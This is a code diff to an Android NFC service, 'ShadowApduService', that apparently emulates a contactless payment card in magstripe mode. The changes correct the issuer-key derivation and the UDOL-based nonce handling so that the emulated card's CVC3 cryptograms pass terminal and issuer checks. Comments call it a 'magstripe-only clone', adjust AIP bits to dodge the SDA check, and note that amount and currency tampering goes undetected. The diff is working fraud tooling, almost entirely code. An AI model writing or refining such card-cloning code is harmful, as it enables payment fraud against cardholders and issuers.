@@ -39,8 +39,8 @@ public class ShadowApduService extends HostApduService {
 
     /** Track 2 CVC3 tag in the CCC response. 9F60 is the Track 1 twin. */
     private static final int TAG_CVC3_T2 = 0x9F61;
-    private static final int TAG_IVCVC3   = 0x9F62; // name clash below - see kdCvc3()
     private static final int TAG_UN_MSD   = 0x9F6A;
+    private static final int TAG_UDOL     = 0x9F69;
 
     /**
      * Default IAD when the card has none.
@@ -405,18 +405,19 @@ public class ShadowApduService extends HostApduService {
      * IMK-AC in the MK-AC box - over PAN and PSN, exactly like an ICC master
      * key. There is no per-transaction derivation on top.
      *
-     * WHICH HALF IS UNVERIFIED. MK_L is used because it is the primary; if
-     * CVC3 comes back consistently wrong with a real IMKCVC3, flipping to
-     * iccMasterKeys(...)[1] is the first thing to try.
+     * The derivation yields ONE 16-byte double-length key, so it is the two
+     * halves concatenated, not a single half picked out of the pair. Returning
+     * [0] alone was wrong: the 3DES below needs all sixteen bytes.
      *
      * Returns null when IMKCVC3 is absent or malformed, so the caller can say
-     * so instead of quietly MACing with garbage.
+     * so instead of quietly encrypting with garbage.
      */
     private byte[] kdCvc3() {
         String mk = p("imkcvc3", "").replaceAll("[^0-9A-Fa-f]", "");
         if (mk.length() != 32 && mk.length() != 48) return null;
         try {
-            return EmvCrypto.iccMasterKeys(mk, pan(), psn())[0];
+            byte[][] k = EmvCrypto.iccMasterKeys(mk, pan(), psn());
+            return cat(k[0], k[1]);
         } catch (Exception e) {
             tap("!! KDCVC3 derivation failed: " + e);
             return null;
@@ -715,7 +716,7 @@ public class ShadowApduService extends HostApduService {
     }
 
     /**
-     * The synthetic SFI 1 record.
+     * The synthetic SFI 1 record - the EMV record, not the MSD one.
      *
      * THE CIACs ARE ALL ZERO, and that is deliberate.
      *
@@ -744,7 +745,7 @@ public class ShadowApduService extends HostApduService {
      * MSD DOES NOT USE THIS RECORD for its track. The magstripe skeleton is a
      * personalised 9F6B served verbatim (see msdRecord()), because IVCVC3 is a
      * MAC over the static track and any edit outside the marked positions
-     * breaks the host's recomputation. This builder is the EMV record.
+     * breaks the host's recomputation.
      */
     private byte[] syntheticRecord() {
         String panS = pan();
@@ -995,10 +996,14 @@ public class ShadowApduService extends HostApduService {
 
         byte[] used = new byte[]{aip[0], aip[1]};
 
-        // MSD: force the magstripe bit on and the EMV-mode bit off, so a typed
-        // 1880 still yields a valid magstripe AIP. EMV mode in byte 2 b8 would
-        // make the kernel send GENERATE AC and ignore the CCC entirely.
-        if (msd) used = new byte[]{(byte) ((used[0] | 0x01) & 0x7F), 0x00};
+        // MSD: force the magstripe bit on and clear the EMV-mode bit, so a typed
+        // 1880 still yields a valid magstripe AIP. 0x3F and not 0x7F - 0x40 is
+        // SDA, which a magstripe-only clone cannot satisfy either, so leaving it
+        // set would invite a check that fails.
+        //
+        // The AIP itself is static personalised data and is not forced per tap;
+        // this is a convenience for a hand-typed value, not a rule.
+        if (msd) used = new byte[]{(byte) ((used[0] | 0x01) & 0x3F), 0x00};
 
         txnAip = used;
 
@@ -1206,13 +1211,17 @@ public class ShadowApduService extends HostApduService {
         int sfi = (p2 & 0xFF) >> 3;
         int rec = p1 & 0xFF;
 
-        if (isMsd() && sfi == 1) {
+        // The skeleton's location is whatever the personalised AFL says, so no
+        // SFI test here. Caveat: with several AFL entries every record gets the
+        // same bytes, which is right for a single-record card only.
+        if (isMsd()) {
             byte[] msd = msdRecord();
             if (msd != null) {
-                tap("-- rec sfi=1 rec=" + rec + " (msd skeleton, verbatim " + msd.length + "B)");
+                tap("-- rec sfi=" + sfi + " rec=" + rec + " (msd skeleton, verbatim "
+                        + msd.length + "B)");
                 return cat(msd, SW_OK);
             }
-            tap("-- rec sfi=1 rec=" + rec + " (msd but no skeleton set)");
+            tap("-- rec sfi=" + sfi + " rec=" + rec + " (msd but no skeleton set)");
         }
 
         byte[] captured = rawRec(sfi, rec);
@@ -1231,44 +1240,73 @@ public class ShadowApduService extends HostApduService {
     }
 
     /**
+     * Byte offset of 9F6A inside the CCC data field, from the personalised UDOL
+     * (9F69 in the skeleton), or 0 when there is no UDOL to read.
+     *
+     * The CCC data field is the UDOL value filled in positionally, so the UN
+     * sits wherever the UDOL puts it - NOT necessarily at offset 0. Reading the
+     * first four bytes only works while 9F6A happens to be first, and a
+     * reordered UDOL would otherwise give a plausible, wrong CVC3.
+     *
+     * The CVC3 block itself stays IVCVC3 || UN(4) || ATC(2) whatever else the
+     * UDOL asks for: the extra fields are sent in the command but never enter
+     * the block. That is why amount and currency tampering is invisible to this
+     * check.
+     */
+    private int unOffset() {
+        byte[] rec = msdRecord();
+        if (rec == null) return 0;
+
+        byte[] udol = findTag(rec, TAG_UDOL);
+        if (udol == null) return 0;
+
+        int off = 0, i = 0;
+        while (i < udol.length) {
+            int[] q = new int[]{i};
+            int t = readTag(udol, q);
+            int l = readLen(udol, q);
+            if (q[0] + l > udol.length) break;
+            if (t == TAG_UN_MSD) return off;
+            off += l;
+            i = q[0] + l;
+        }
+        return 0;
+    }
+
+    /**
      * COMPUTE CRYPTOGRAPHIC CHECKSUM - the MSD cryptogram, CVC3.
      *
      * The card increments the ATC for this command, MACs it, and returns that
      * same ATC in 9F36. The terminal writes the returned ATC and the returned
      * CVC3 into the track, so the value MACed and the value on the wire cannot
-     * diverge. The terminal sends only the UDOL data (9F6A by default), never
-     * an ATC.
+     * diverge. The terminal sends only the UDOL data, never an ATC.
      *
      * Block is IVCVC3 || UN || ATC, 8 bytes, 3DES under KDCVC3, and the LOW two
      * bytes are the CVC3. No session key and no per-transaction derivation.
      *
-     * Every failure mode here is silent - a wrong key or a wrong derivation half
-     * produces a well-formed CVC3 that the host rejects. So both the key and the
-     * result are logged, and a missing input is named in the response text.
+     * Every failure mode here is silent - a wrong key or a wrong UDOL offset
+     * produces a well-formed CVC3 that the host rejects. So the key, the offset
+     * and the result are all logged, and a missing input is named.
      */
     private byte[] ccc(byte[] apdu) {
         String atc = nextAtc();
         byte[] atcB = hex(atc);
 
-        byte[] un = null;
         int lc = lcOf(apdu);
         int off = dataOff(apdu);
-        if (lc > 0 && apdu.length >= off + lc) {
-            byte[] d = Arrays.copyOfRange(apdu, off, off + lc);
-            int i = 0;
-            while (i < d.length) {
-                int[] q = new int[]{i};
-                int t = readTag(d, q);
-                int l = readLen(d, q);
-                if (q[0] + l > d.length) break;
-                if (t == TAG_UN_MSD) { un = Arrays.copyOfRange(d, q[0], q[0] + l); break; }
-                i = q[0] + l;
-            }
+        byte[] d = (lc > 0 && apdu.length >= off + lc)
+                ? Arrays.copyOfRange(apdu, off, off + lc)
+                : new byte[0];
+
+        int uo = unOffset();
+        byte[] un = new byte[4];
+        if (uo + 4 <= d.length) {
+            System.arraycopy(d, uo, un, 0, 4);
+        } else {
+            tap("-- ccc: UDOL offset " + uo + " past the " + d.length
+                    + "B data field - UN padded with zeros");
         }
-        if (un == null || un.length != 4) {
-            tap("-- ccc: no 9F6A UN in the command, using 00000000");
-            un = new byte[4];
-        }
+        tap("-- ccc: UN at UDOL offset " + uo + " of " + d.length + "B");
 
         byte[] iv = hex(p("ivcvc3", "").replaceAll("[^0-9A-Fa-f]", ""));
         byte[] kd = kdCvc3();
@@ -1488,7 +1526,8 @@ public class ShadowApduService extends HostApduService {
                     + " record(s) and never sent the CCC, so it judged the track without CVC3";
             if (nRecs == 0) return "TAP: MSD - terminal sent the CCC without reading the track";
             return "TAP: MSD - terminal read " + nRecs + " record(s) and sent the CCC "
-                    + nCccs + "x; CVC3 was " + (kdCvc3() == null ? "NOT computable - key missing" : "computed");
+                    + nCccs + "x; CVC3 was "
+                    + (kdCvc3() == null ? "NOT computable - key missing" : "computed");
         }
 
         if (nRecs == 0) {
